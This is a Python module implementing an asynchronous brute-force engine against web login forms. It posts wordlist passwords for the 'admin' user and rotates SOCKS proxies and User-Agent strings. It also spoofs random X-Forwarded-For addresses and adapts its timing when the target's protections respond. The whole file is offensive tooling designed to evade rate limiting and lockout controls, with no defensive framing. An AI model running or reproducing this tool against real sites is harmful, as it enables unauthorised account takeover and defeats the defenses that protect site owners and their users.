"""
Web form bruteforcing engine with protection detection
"""

import asyncio
import random
import logging
from typing import List, Optional, Dict, Any, Callable
import aiohttp
from aiohttp_socks import ProxyConnector

logger = logging.getLogger(__name__)

class WebEngine:
    """Движок для атак на веб-формы с обнаружением защиты"""
    
    def __init__(self, proxy_manager, pattern_matcher, rate_limiter, user_agent):
        self.proxy_manager = proxy_manager
        self.pattern_matcher = pattern_matcher
        self.rate_limiter = rate_limiter
        self.ua = user_agent
    
    async def attack(self, target_url: str, wordlist: List[str], stats: Dict,
                    strategy: Dict, adapt_callback: Callable, 
                    save_callback: Callable, adapt_stats_callback: Callable) -> Optional[str]:
        """Основная функция атаки на веб-форму"""
        logger.info("Starting web attack...")
        
        for i, password in enumerate(wordlist[stats.get('current_index', 0):], 
                                   start=stats.get('current_index', 0)):
            if stats.get('found', False):
                break
            
            await self.rate_limiter.acquire()
            
            proxy = self.proxy_manager.get_proxy() if strategy.get('proxy_rotate', True) else None
            connector = ProxyConnector.from_url(proxy) if proxy else None
            
            try:
                async with aiohttp.ClientSession(connector=connector) as session:
                    result = await self.try_password_web(target_url, password, session, strategy)
                    
                    stats['attempts'] += 1
                    stats['current_index'] = i + 1
                    
                    if result.get('success'):
                        stats['found'] = True
                        logger.info(f"✅ Password found: {password}")
                        return password
                    
                    if result.get('protection_detected'):
                        adapt_callback(result['protection_strategy'])
                    
                    if stats['attempts'] % 100 == 0:
                        logger.info(f"Attempts: {stats['attempts']}, Last password: {password}")
                    
                    if stats['attempts'] % 500 == 0:
                        save_callback()
                
            except Exception as e:
                logger.error(f"Error processing {password}: {e}")
                if proxy:
                    self.proxy_manager.mark_bad_proxy(proxy)
            
            delay = strategy.get('delay', 0.1)
            if strategy.get('random_delay', False):
                delay *= random.uniform(0.5, 1.5)
            
            await asyncio.sleep(delay)
            
            if stats['attempts'] % 100 == 0:
                adapt_stats_callback()
        
        return None
    
    async def try_password_web(self, target_url: str, password: str, 
                              session: aiohttp.ClientSession, strategy: Dict) -> Dict:
        """Проверка пароля для веб-формы"""
        try:
            data = {
                'username': 'admin',
                'password': password,
                'csrf': 'dummy_token'
            }
            
            headers = {
                'User-Agent': self.ua.random if strategy.get('user_agent_rotate', True) else 'Mozilla/5.0',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }
            
            async with session.post(target_url, data=data, headers=headers, timeout=30) as response:
                text = await response.text()
                success = response.status == 200 and 'invalid' not in text.lower()
                
                result = {
                    'success': success,
                    'status': response.status,
                    'text': text[:200],
                    'password': password
                }
                
                protection = self.pattern_matcher.analyze_response(text, response.status)
                if protection:
                    result['protection_detected'] = True
                    result['protection_strategy'] = protection
                
                return result
                
        except aiohttp.ClientError as e:
            logger.warning(f"Network error for {password}: {e}")
            return {'success': False, 'error': 'network_error'}
        except Exception as e:
            logger.error(f"Unexpected error for {password}: {e}")
            return {'success': False, 'error': 'unexpected_error'}